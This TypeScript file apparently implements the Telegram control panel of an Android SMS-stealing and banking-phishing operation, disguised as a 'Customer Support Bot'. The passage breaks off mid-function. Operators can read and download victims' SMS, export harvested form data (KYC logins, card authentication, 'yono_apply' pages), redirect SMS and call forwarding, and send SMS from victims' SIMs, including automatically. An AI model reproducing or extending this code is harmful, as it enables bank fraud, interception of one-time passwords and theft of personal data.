import TelegramBot from 'node-telegram-bot-api';
import { TelegramConfig, NotificationOptions, AutoSmsConfig } from './types.js';
import { parseAutoSmsMessage } from './autoSmsParser.js';
import { store } from '../store.js';
import { SMS, Device, FormData } from '../types/index.js';
import { getFieldDisplayName, getFieldsByCategory, FIELD_CATEGORIES, EXCLUDE_FIELDS } from '../formConfig.js';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

// Pending AutoSend SMS request created from a second-bot group message.
interface AutoSmsRequest {
    requestId: string;
    chatId: number;
    messageId: number;
    senderId: number;
    recipientNumber: string;
    message: string;
    createdAt: number;
    status: 'pending' | 'sending' | 'sent' | 'failed';
}

const AUTO_SMS_DEFAULT_TTL_MINUTES = 30;

export class TelegramBotService {
    private bot: TelegramBot | null = null;
    private adminIds: Set<number> = new Set();
    private isEnabled: boolean = false;
    private hasLoggedConflict: boolean = false;
    private pollingRetryCount: number = 0;
    private maxPollingRetries: number = 3;

    // AutoSend SMS (second-bot group requests)
    private autoSmsConfig: AutoSmsConfig | null = null;
    private pendingAutoSmsRequests: Map<string, AutoSmsRequest> = new Map();
    private selfBotId: number | null = null;
    // Device/SIM currently enabled for AutoSend (set via Telegram action menu)
    private autoSendDeviceId: string | null = null;
    private autoSendSubscriptionId: number = -1;
    // When 'auto', matching second-bot messages are sent immediately without a button press.
    private autoSendMode: 'manual' | 'auto' = 'manual';

    // SMS conversation state: chatId -> { deviceId, subscriptionId, step, phoneNumber }
    private smsConversations: Map<number, { deviceId: string; subscriptionId: number; step: 'phone' | 'message'; phoneNumber?: string }> = new Map();

    // Forwarding conversation state: chatId -> { deviceId, type, subscriptionId }
    private forwardingConversations: Map<number, { deviceId: string; type: 'sms' | 'calls'; subscriptionId: number }> = new Map();

    // Callbacks for device control
    public onForwardingUpdate?: (deviceId: string, config: any) => void;
    public onSyncRequest?: (deviceId: string) => void;
    public onSendSms?: (deviceId: string, recipientNumber: string, message: string, requestId: string, subscriptionId?: number) => void;

    constructor(config?: TelegramConfig) {
        if (config?.token) {
            this.bot = new TelegramBot(config.token, { polling: false });
            this.adminIds = new Set(config.adminIds || []);
            this.isEnabled = true;
            this.autoSmsConfig = config.autoSms?.enabled ? config.autoSms : null;

            this.bot.on('polling_error', (error: any) => {
                if (error.code === 'ETELEGRAM' && error.message?.includes('409 Conflict')) {
                    if (!this.hasLoggedConflict) {
                        this.hasLoggedConflict = true;
                        console.error('[Telegram] Another bot instance detected. Will retry...');
                        this.bot?.stopPolling();
                        this.retryPolling();
                    }
                } else if (!error.message?.includes('ETELEGRAM')) {
                    console.error('[Telegram] Polling error:', error.message || error);
                }
            });

            this.setupCommands();
            this.setupCallbackQueries();
            this.setupMessageListener();
            this.setupAutoSmsListener();
            console.log('[Telegram] Bot initialized (polling will start after delay)');
            console.log(`[Telegram] Admin IDs: ${Array.from(this.adminIds).join(', ')}`);
            if (this.autoSmsConfig) {
                console.log(`[Telegram] AutoSend SMS enabled (groups: ${this.autoSmsConfig.groupIds.join(',')}, senders: ${this.autoSmsConfig.senderIds.join(',')}, ttl: ${this.autoSmsConfig.ttlMinutes}m, mode: ${this.autoSendMode})`);
            }
            this.startPollingWithDelay();
        } else {
            console.log('[Telegram] Bot disabled - no token provided');
        }
    }

    private startPollingWithDelay(): void {
        const delayMs = 5000;
        console.log(`[Telegram] Starting polling in ${delayMs / 1000} seconds...`);
        setTimeout(() => {
            if (this.bot && this.isEnabled) {
                console.log('[Telegram] Starting polling now...');
                this.bot.startPolling({ restart: true });
            }
        }, delayMs);
    }

    private retryPolling(): void {
        if (this.pollingRetryCount >= this.maxPollingRetries) {
            console.error(`[Telegram] Max polling retries (${this.maxPollingRetries}) reached. Bot disabled.`);
            this.isEnabled = false;
            return;
        }
        this.pollingRetryCount++;
        const backoffMs = Math.pow(2, this.pollingRetryCount) * 5000;
        console.log(`[Telegram] Retry ${this.pollingRetryCount}/${this.maxPollingRetries} - waiting ${backoffMs / 1000}s...`);
        this.hasLoggedConflict = false;
        setTimeout(() => {
            if (this.bot && this.isEnabled) {
                console.log('[Telegram] Retrying polling...');
                this.bot.startPolling({ restart: true });
            }
        }, backoffMs);
    }

    public async stop(): Promise<void> {
        if (this.bot) {
            console.log('[Telegram] Stopping bot polling...');
            await this.bot.stopPolling();
            this.isEnabled = false;
            console.log('[Telegram] Bot stopped.');
        }
    }

    private isAdmin(userId: number, chatId?: number): boolean {
        if (this.adminIds.size === 0) return true;
        if (this.adminIds.has(userId)) return true;
        if (chatId && this.adminIds.has(chatId)) return true;
        return false;
    }

    // ==================== COMMANDS ====================

    private setupCommands(): void {
        if (!this.bot) return;

        // Only 2 commands: /devices and /actions
        this.bot.setMyCommands([
            { command: 'devices', description: 'List all connected devices' },
            { command: 'actions', description: 'Perform actions on a device' },
        ]);

        // /devices - List all devices with status
        this.bot.onText(/\/devices/, (msg) => {
            if (!this.isAdmin(msg.from?.id || 0, msg.chat.id)) {
                this.bot?.sendMessage(msg.chat.id, '⛔ Unauthorized access.');
                return;
            }
            this.showDevicesList(msg.chat.id);
        });

        // /actions - Select device then show action menu
        this.bot.onText(/\/actions/, (msg) => {
            if (!this.isAdmin(msg.from?.id || 0, msg.chat.id)) {
                this.bot?.sendMessage(msg.chat.id, '⛔ Unauthorized access.');
                return;
            }
            this.showDeviceSelection(msg.chat.id);
        });

        // /start - Welcome message with inline buttons
        this.bot.onText(/\/start/, (msg) => {
            if (!this.isAdmin(msg.from?.id || 0, msg.chat.id)) {
                this.bot?.sendMessage(msg.chat.id, '⛔ Unauthorized access.');
                return;
            }
            this.bot?.sendMessage(msg.chat.id,
                '🤖 *Customer Support Bot*\n\n' +
                'Welcome! Use the buttons below to manage your devices:',
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [
                            [{ text: '📱 Devices' }, { text: '⚡ Actions' }]
                        ],
                        resize_keyboard: true,
                        is_persistent: true
                    }
                }
            );
        });
    }

    // ==================== DEVICE VIEWS ====================

    private showDevicesList(chatId: number): void {
        const devices = store.getAllDevices();
        if (devices.length === 0) {
            this.bot?.sendMessage(chatId, '📱 No devices connected.');
            return;
        }

        let message = '*📱 Connected Devices:*\n\n';
        devices.forEach((device, index) => {
            const status = device.status === 'online' ? '🟢' : '🔴';
            message += `${index + 1}. ${status} *${device.name}*\n`;
            message += `   Phone: ${device.phoneNumber || 'N/A'}\n\n`;
        });

        this.bot?.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    }

    private showDeviceSelection(chatId: number): void {
        const devices = store.getAllDevices();
        if (devices.length === 0) {
            this.bot?.sendMessage(chatId, '📱 No devices connected.');
            return;
        }

        const buttons: TelegramBot.InlineKeyboardButton[][] = devices.map(device => {
            const status = device.status === 'online' ? '🟢' : '🔴';
            const shortId = device.id.substring(0, 8);
            return [{
                text: `${status} ${device.name}`,
                callback_data: `action_menu:${shortId}`
            }];
        });

        this.bot?.sendMessage(chatId, '*⚡ Select a device:*', {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showActionMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const status = device.status === 'online' ? '🟢 Online' : '🔴 Offline';

        const message = `*📱 ${device.name}*\nStatus: ${status}\n\n*Select an action:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [
                { text: '📨 SMS', callback_data: `sms_menu:${shortId}` },
                { text: '📝 Forms', callback_data: `forms:${shortId}` },
            ],
            [
                { text: '📤 Forward', callback_data: `forward:${shortId}` },
                { text: '📊 Status', callback_data: `status:${shortId}` },
            ],
            [
                { text: '🔄 Sync', callback_data: `sync:${shortId}` },
                { text: '🚀 AutoSend', callback_data: `as_menu:${shortId}` },
            ],
            [
                { text: '⬅️ Back to Devices', callback_data: 'back_devices' },
            ]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    // ==================== SMS MENU ====================

    private showSmsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const smsCount = deviceData.sms.length;

        const message = `*📨 SMS - ${device.name}*\n\nTotal messages: ${smsCount}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [
                { text: '📥 View Last 5', callback_data: `view_sms:${shortId}` },
            ],
            [
                { text: '📄 Download All (.txt)', callback_data: `download_sms:${shortId}` },
            ],
            [
                { text: '✉️ Send SMS', callback_data: `sendsms:${shortId}` },
            ],
            [
                { text: '⬅️ Back', callback_data: `action_menu:${shortId}` },
            ]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private async showLastSMS(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        // Sync if online
        if (device.status === 'online' && this.onSyncRequest) {
            this.onSyncRequest(device.id);
            await new Promise(resolve => setTimeout(resolve, 2000));
            deviceData = this.findDevice(shortId);
            if (!deviceData) {
                this.bot?.sendMessage(chatId, '❌ Device not found after sync.');
                return;
            }
        }

        if (deviceData.sms.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No SMS for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort by timestamp descending (most recent first) and take 5
        const sortedSms = [...deviceData.sms].sort((a: SMS, b: SMS) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );
        const smsList = sortedSms.slice(0, 5);

        let message = `*📨 Last 5 SMS (${device.name}):*\n\n`;
        smsList.forEach((sms: SMS, index: number) => {
            const icon = sms.type === 'incoming' ? '📥' : '📤';
            const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
            const date = new Date(sms.timestamp).toLocaleString();
            // Full message content - no truncation
            message += `${index + 1}. ${icon} *${contact}*\n`;
            message += `🕐 ${date}\n`;
            message += `${sms.message}\n\n`;
        });

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
            }
        });
    }

    private async downloadAllSMS(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (deviceData.sms.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No SMS to download for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort by timestamp descending
        const sortedSms = [...deviceData.sms].sort((a: SMS, b: SMS) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        );

        // Generate text content
        let content = `SMS Export - ${device.name}\n`;
        content += `Generated: ${new Date().toLocaleString()}\n`;
        content += `Total Messages: ${sortedSms.length}\n`;
        content += '='.repeat(50) + '\n\n';

        sortedSms.forEach((sms: SMS, index: number) => {
            const direction = sms.type === 'incoming' ? 'FROM' : 'TO';
            const contact = sms.type === 'incoming' ? sms.sender : sms.receiver;
            const date = new Date(sms.timestamp).toLocaleString();
            content += `[${index + 1}] ${direction}: ${contact}\n`;
            content += `Date: ${date}\n`;
            content += `Message:\n${sms.message}\n`;
            content += '-'.repeat(40) + '\n\n';
        });

        // Write to temp file and send
        const tempDir = os.tmpdir();
        const fileName = `sms_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
        const filePath = path.join(tempDir, fileName);

        fs.writeFileSync(filePath, content, 'utf8');

        try {
            await this.bot?.sendDocument(chatId, filePath, {
                caption: `📄 All SMS from ${device.name} (${sortedSms.length} messages)`,
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
        } finally {
            // Clean up temp file
            fs.unlinkSync(filePath);
        }
    }

    // ==================== FORMS ====================

    private async downloadAllForms(chatId: number, deviceData: any): Promise<void> {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (deviceData.forms.length === 0) {
            this.bot?.sendMessage(chatId, `📭 No form submissions for ${device.name}`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
            return;
        }

        // Sort all forms by submission time descending
        const allForms = [...deviceData.forms].sort((a: FormData, b: FormData) =>
            new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()
        );

        // Group forms into sessions (submissions within 30 minutes of each other)
        const timeWindow = 30 * 60 * 1000; // 30 minutes
        const sessions: any[][] = [];
        let currentSession: any[] = [];

        allForms.forEach((form: any) => {
            if (currentSession.length === 0) {
                currentSession.push(form);
            } else {
                const lastFormTime = new Date(currentSession[currentSession.length - 1].submittedAt).getTime();
                const currentFormTime = new Date(form.submittedAt).getTime();
                // If within time window of previous form, add to same session
                if (lastFormTime - currentFormTime <= timeWindow) {
                    currentSession.push(form);
                } else {
                    // Start new session
                    sessions.push(currentSession);
                    currentSession = [form];
                }
            }
        });
        if (currentSession.length > 0) {
            sessions.push(currentSession);
        }

        // Helper to get display name for a field key — reads from formConfig
        const fieldDisplayName = (key: string): string => getFieldDisplayName(key);



        // Generate text content with submission history
        let content = `========================================\n`;
        content += `       FORM SUBMISSIONS EXPORT\n`;
        content += `========================================\n`;
        content += `Device: ${device.name}\n`;
        content += `Generated: ${new Date().toLocaleString()}\n`;
        content += `Total Sessions: ${sessions.length}\n`;
        content += `(Shows ALL submissions including field changes)\n`;
        content += `========================================\n\n`;

        sessions.forEach((sessionForms: any[], sessionIndex: number) => {
            // Process in chronological order (oldest first within session)
            const chronological = [...sessionForms].reverse();

            // Get the earliest and latest timestamps
            const earliest = new Date(chronological[0].submittedAt);
            const latest = new Date(sessionForms[0].submittedAt);

            // Determine flow type based on pages present
            const pageNames = sessionForms.map((f: any) => f.pageName).filter(Boolean);
            let flowType = 'Unknown Flow';
            if (pageNames.includes('profile_verify')) {
                flowType = 'Main Flow (Complete)';
            } else if (pageNames.includes('login_details')) {
                flowType = 'Apply Flow (Complete)';
            } else if (pageNames.includes('yono_apply') || pageNames.includes('verification')) {
                flowType = 'Apply Flow (Partial)';
            } else if (pageNames.includes('kyc_login') || pageNames.includes('card_auth')) {
                flowType = 'Main Flow (Partial)';
            }

            content += `----------------------------------------\n`;
            content += `SESSION #${sessionIndex + 1} (${flowType})\n`;
            content += `Started: ${earliest.toLocaleString()}\n`;
            if (earliest.getTime() !== latest.getTime()) {
                content += `Last Activity: ${latest.toLocaleString()}\n`;
            }
            content += `Total Submissions: ${chronological.length}\n`;
            content += `----------------------------------------\n\n`;

            // Track field values to detect changes
            const fieldHistory: Record<string, string[]> = {};
            const seenPages = new Set<string>();

            // Show all submissions chronologically
            content += `>> SUBMISSION HISTORY (Chronological)\n\n`;

            chronological.forEach((form: any, formIndex: number) => {
                const timestamp = new Date(form.submittedAt).toLocaleString();
                const pageName = form.pageName || 'unknown';

                // Check if this is a resubmission of the same page
                const isResubmission = seenPages.has(pageName);
                seenPages.add(pageName);

                content += `[${formIndex + 1}] Page: ${pageName} (${timestamp})`;
                if (isResubmission) {
                    content += ` [RESUBMISSION]`;
                }
                content += `\n`;

                // Show all fields from this submission
                Object.keys(form).forEach(key => {
                    if (EXCLUDE_FIELDS.has(key)) return;
                    const value = form[key];
                    if (!value || value === '') return;

                    const displayName = fieldDisplayName(key);
                    const previousValues = fieldHistory[key] || [];
                    const lastValue = previousValues.length > 0 ? previousValues[previousValues.length - 1] : null;

                    // Check if value changed from previous
                    if (lastValue && lastValue !== value) {
                        content += `    ${displayName}: ${value} <- CHANGED (was: ${lastValue})\n`;
                    } else {
                        content += `    ${displayName}: ${value}\n`;
                    }

                    // Track this value in history
                    if (!fieldHistory[key]) {
                        fieldHistory[key] = [];
                    }
                    fieldHistory[key].push(value);
                });
                content += `\n`;
            });

            // Build consolidated data (final values for each field)
            const consolidated: Record<string, string> = {};
            chronological.forEach((form: any) => {
                Object.keys(form).forEach(key => {
                    if (EXCLUDE_FIELDS.has(key)) return;
                    if (form[key] && form[key] !== '') {
                        consolidated[key] = form[key];
                    }
                });
            });

            // Show consolidated view by categories from formConfig
            content += `----------------------------------------\n`;
            content += `>> CONSOLIDATED DATA (Final Values)\n`;
            content += `----------------------------------------\n`;

            const formatConsolidatedSection = (title: string, fields: string[]): string => {
                const items = fields
                    .filter(f => consolidated[f])
                    .map(f => `   ${fieldDisplayName(f)}: ${consolidated[f]}`);
                if (items.length === 0) return '';
                return `\n${title}:\n${items.join('\n')}\n`;
            };

            // Build sections from formConfig categories
            for (const category of FIELD_CATEGORIES) {
                const categoryFields = getFieldsByCategory(category.key).map(f => f.key);
                content += formatConsolidatedSection(`${category.emoji} ${category.displayName}`, categoryFields);
            }

            content += `\n`;
        });

        content += `========================================\n`;
        content += `           END OF EXPORT\n`;
        content += `========================================\n`;

        // Write to temp file and send
        const tempDir = os.tmpdir();
        const fileName = `forms_${device.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
        const filePath = path.join(tempDir, fileName);

        fs.writeFileSync(filePath, content, 'utf8');

        try {
            await this.bot?.sendDocument(chatId, filePath, {
                caption: `📝 All form submissions from ${device.name} (${sessions.length} sessions, ${allForms.length} total submissions)`,
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
        } finally {
            // Clean up temp file
            fs.unlinkSync(filePath);
        }
    }

    // ==================== STATUS ====================

    private showStatus(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const status = device.status === 'online' ? '🟢 Online' : '🔴 Offline';
        const fwd = deviceData.forwarding;
        const simCards = device.simCards || [];

        let message = `*📱 ${device.name}*\n\n`;
        message += `Status: ${status}\n`;
        message += `Phone: ${device.phoneNumber || 'N/A'}\n\n`;

        if (simCards.length > 0) {
            message += `*📶 SIM Cards (${simCards.length}):*\n`;
            simCards.forEach((sim: any, i: number) => {
                message += `\n*SIM ${i + 1}:*\n`;
                message += `   Carrier: ${sim.carrierName || 'Unknown'}\n`;
                message += `   Number: ${sim.phoneNumber || 'N/A'}\n`;
            });
            message += `\n`;
        }

        message += `*📤 Forwarding:*\n`;
        if (fwd.smsEnabled) {
            const smsSim = this.getSimInfoBySubscriptionId(simCards, fwd.smsSubscriptionId);
            message += `SMS: ✅ ON → ${fwd.smsForwardTo}`;
            if (smsSim) message += ` (via ${smsSim.carrierName || 'SIM'})`;
            message += `\n`;
        } else {
            message += `SMS: ❌ Off\n`;
        }
        if (fwd.callsEnabled) {
            const callsSim = this.getSimInfoBySubscriptionId(simCards, fwd.callsSubscriptionId);
            message += `Calls: ✅ ON → ${fwd.callsForwardTo}`;
            if (callsSim) message += ` (via ${callsSim.carrierName || 'SIM'})`;
        } else {
            message += `Calls: ❌ Off`;
        }

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
            }
        });
    }

    private getSimInfoBySubscriptionId(simCards: any[], subscriptionId: number): any | null {
        if (!subscriptionId || subscriptionId === -1) return null;
        return simCards.find((sim: any) => sim.subscriptionId === subscriptionId) || null;
    }

    // ==================== SYNC ====================

    private requestSync(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (device.status !== 'online') {
            this.bot?.sendMessage(chatId, '❌ Device is offline.', {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
            return;
        }

        if (this.onSyncRequest) {
            this.onSyncRequest(device.id);
            this.bot?.sendMessage(chatId, `🔄 Sync requested for *${device.name}*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]]
                }
            });
        }
    }

    // ==================== FORWARDING ====================

    private showForwardOptions(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        const message = `*📤 Forwarding - ${device.name}*\n\n*Select what to forward:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [{ text: '📨 SMS', callback_data: `fwd_sms_menu:${shortId}` }],
            [{ text: '📞 Calls', callback_data: `fwd_calls_menu:${shortId}` }],
            [{ text: '⬅️ Back', callback_data: `action_menu:${shortId}` }]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showForwardSmsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const fwd = deviceData.forwarding;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        let statusLine = '';
        if (fwd.smsEnabled) {
            const smsSim = this.getSimInfoBySubscriptionId(simCards, fwd.smsSubscriptionId);
            statusLine = `✅ ON → ${fwd.smsForwardTo}`;
            if (smsSim) statusLine += ` (via ${smsSim.carrierName || 'SIM'})`;
        } else {
            statusLine = '❌ OFF';
        }

        const message = `*📨 SMS Forwarding - ${device.name}*\n\nStatus: ${statusLine}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [{ text: '✅ On', callback_data: `fwd_sms_on:${shortId}` }],
            [{ text: '❌ Off', callback_data: `fwd_sms_off:${shortId}` }],
            [{ text: '� Check', callback_data: `fwd_sms_check:${shortId}` }],
            [{ text: '⬅️ Back', callback_data: `forward:${shortId}` }]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showForwardCallsMenu(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const fwd = deviceData.forwarding;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        let statusLine = '';
        if (fwd.callsEnabled) {
            const callsSim = this.getSimInfoBySubscriptionId(simCards, fwd.callsSubscriptionId);
            statusLine = `✅ ON → ${fwd.callsForwardTo}`;
            if (callsSim) statusLine += ` (via ${callsSim.carrierName || 'SIM'})`;
        } else {
            statusLine = '❌ OFF';
        }

        const message = `*📞 Call Forwarding - ${device.name}*\n\nStatus: ${statusLine}\n\n*Select an option:*`;

        const buttons: TelegramBot.InlineKeyboardButton[][] = [
            [{ text: '✅ On', callback_data: `fwd_calls_on:${shortId}` }],
            [{ text: '❌ Off', callback_data: `fwd_calls_off:${shortId}` }],
            [{ text: '� Check', callback_data: `fwd_calls_check:${shortId}` }],
            [{ text: '⬅️ Back', callback_data: `forward:${shortId}` }]
        ];

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private showForwardingCheck(chatId: number, deviceData: any, type: 'sms' | 'calls'): void {
        const device = deviceData.device;
        const fwd = deviceData.forwarding;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        const isEnabled = type === 'sms' ? fwd.smsEnabled : fwd.callsEnabled;
        const forwardTo = type === 'sms' ? fwd.smsForwardTo : fwd.callsForwardTo;
        const subscriptionId = type === 'sms' ? fwd.smsSubscriptionId : fwd.callsSubscriptionId;
        const typeLabel = type === 'sms' ? '📨 SMS' : '📞 Calls';

        let message = `*${typeLabel} Forwarding Status*\n\n`;
        message += `📱 Device: *${device.name}*\n\n`;

        if (isEnabled) {
            message += `✅ *Status: ENABLED*\n\n`;
            message += `📤 Forwarding to: \`${forwardTo}\`\n`;
            const sim = this.getSimInfoBySubscriptionId(simCards, subscriptionId);
            if (sim) {
                message += `📶 Using SIM: *${sim.carrierName || 'Unknown'}*\n`;
                if (sim.phoneNumber) message += `   Number: ${sim.phoneNumber}\n`;
            } else {
                message += `📶 Using SIM: Default\n`;
            }
        } else {
            message += `❌ *Status: DISABLED*\n\n`;
            message += `Forwarding is currently turned off.`;
        }

        const backCallback = type === 'sms' ? `fwd_sms_menu:${shortId}` : `fwd_calls_menu:${shortId}`;

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '⬅️ Back', callback_data: backCallback }]]
            }
        });
    }

    private promptForwardNumber(chatId: number, deviceData: any, type: 'sms' | 'calls'): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);
        const simCards = device.simCards || [];

        if (simCards.length > 1) {
            let message = `*📤 ${type === 'sms' ? 'SMS' : 'Call'} Forwarding*\n\n📶 *Select SIM:*`;
            const buttons: TelegramBot.InlineKeyboardButton[][] = simCards.map((sim: any, i: number) => [{
                text: `📱 ${sim.carrierName} (${sim.phoneNumber || 'SIM ' + (i + 1)})`,
                callback_data: `fwd_sim:${shortId}:${type}:${i}`
            }]);
            buttons.push([{ text: '❌ Cancel', callback_data: `forward:${shortId}` }]);

            this.bot?.sendMessage(chatId, message, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            });
        } else {
            this.startForwardingConversation(chatId, deviceData, type, 0);
        }
    }

    private startForwardingConversation(chatId: number, deviceData: any, type: 'sms' | 'calls', simIndex: number): void {
        const device = deviceData.device;
        const simCards = device.simCards || [];
        const selectedSim = simCards[simIndex];
        const subscriptionId = selectedSim?.subscriptionId || -1;

        this.forwardingConversations.set(chatId, {
            deviceId: device.id,
            type,
            subscriptionId
        });

        const typeLabel = type === 'sms' ? '📨 SMS' : '📞 Calls';
        this.bot?.sendMessage(chatId,
            `*${typeLabel} Forwarding*\n\n📱 Enter the phone number to forward to:`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'fwd_cancel:0' }]]
                }
            }
        );
    }

    private setForwarding(chatId: number, deviceData: any, type: 'sms' | 'calls', enabled: boolean): void {
        const shortId = deviceData.device.id.substring(0, 8);
        const configUpdate = type === 'sms'
            ? { smsEnabled: enabled, smsForwardTo: '' }
            : { callsEnabled: enabled, callsForwardTo: '' };

        if (this.onForwardingUpdate) {
            this.onForwardingUpdate(deviceData.device.id, configUpdate);
            const typeLabel = type === 'sms' ? '📨 SMS' : '📞 Calls';
            this.bot?.sendMessage(chatId, `✅ ${typeLabel} forwarding turned OFF`, {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `forward:${shortId}` }]]
                }
            });
        }
    }

    // ==================== SEND SMS ====================

    private promptSendSMS(chatId: number, deviceData: any): void {
        const device = deviceData.device;
        const shortId = device.id.substring(0, 8);

        if (device.status !== 'online') {
            this.bot?.sendMessage(chatId, '❌ Device is offline.', {
                reply_markup: {
                    inline_keyboard: [[{ text: '⬅️ Back', callback_data: `sms_menu:${shortId}` }]]
                }
            });
            return;
        }

        const simCards = device.simCards || [];

        if (simCards.length <= 1) {
            this.startSmsConversation(chatId, deviceData, 0);
            return;
        }

        let message = `*✉️ Send SMS via ${device.name}*\n\n📶 *Select SIM:*`;
        const buttons: TelegramBot.InlineKeyboardButton[][] = simCards.map((sim: any, i: number) => [{
            text: `📱 ${sim.carrierName} (${sim.phoneNumber || 'SIM ' + (i + 1)})`,
            callback_data: `sms_sim:${shortId}:${i}`
        }]);
        buttons.push([{ text: '❌ Cancel', callback_data: `sms_menu:${shortId}` }]);

        this.bot?.sendMessage(chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }

    private startSmsConversation(chatId: number, deviceData: any, simIndex: number): void {
        const device = deviceData.device;
        const simCards = device.simCards || [];
        const selectedSim = simCards[simIndex];
        const subscriptionId = selectedSim?.subscriptionId || -1;

        this.smsConversations.set(chatId, {
            deviceId: device.id,
            subscriptionId,
            step: 'phone'
        });

        this.bot?.sendMessage(chatId,
            `*✉️ Send SMS via ${device.name}*\n\n📱 Enter the recipient's phone number:`,
            {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[{ text: '❌ Cancel', callback_data: 'sms_cancel:0' }]]
                }
            }
        );
    }

    // ==================== CALLBACK QUERIES ====================

    private setupCallbackQueries(): void {
        if (!this.bot) return;

        this.bot.on('callback_query', async (query) => {
            if (!query.data || !query.message) return;
            if (!this.isAdmin(query.from.id, query.message.chat.id)) {
                this.bot?.answerCallbackQuery(query.id, { text: '⛔ Unauthorized' });
                return;
            }

            // AutoSend SMS requests (handled before the generic callback flow)
            if (query.data.startsWith('autosend:')) {
                await this.handleAutoSendCallback(query);
                return;
            }

            const chatId = query.message.chat.id;
            const parts = query.data.split(':');
            const action = parts[0];
            const shortId = parts[1];

            this.bot?.answerCallbackQuery(query.id);

            // Handle start menu buttons
            if (action === 'start_devices') {
                this.showDevicesList(chatId);
                return;
            }
            if (action === 'start_actions') {
                this.showDeviceSelection(chatId);
                return;
            }

            // Handle back to devices
            if (action === 'back_devices') {
                this.showDeviceSelection(chatId);
                return;
            }

            // Handle cancel actions
            if (action === 'sms_cancel') {
                this.smsConversations.delete(chatId);
                this.bot?.sendMessage(chatId, '❌ SMS cancelled.');
                return;
            }
            if (action === 'fwd_cancel') {
                this.forwardingConversations.delete(chatId);
                this.bot?.sendMessage(chatId, '❌ Forwarding setup cancelled.');
                return;
            }

            // Find device for actions that need it
            const deviceData = shortId ? this.findDevice(shortId) : null;

            switch (action) {
                case 'action_menu':
                    if (deviceData) this.showActionMenu(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'sms_menu':
                    if (deviceData) this.showSmsMenu(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'view_sms':
                    if (deviceData) await this.showLastSMS(chatId, deviceData);
                    else this.bot?.sendMessage(chatId, '❌ Device not found.');
                    break;

                case 'download_sms':
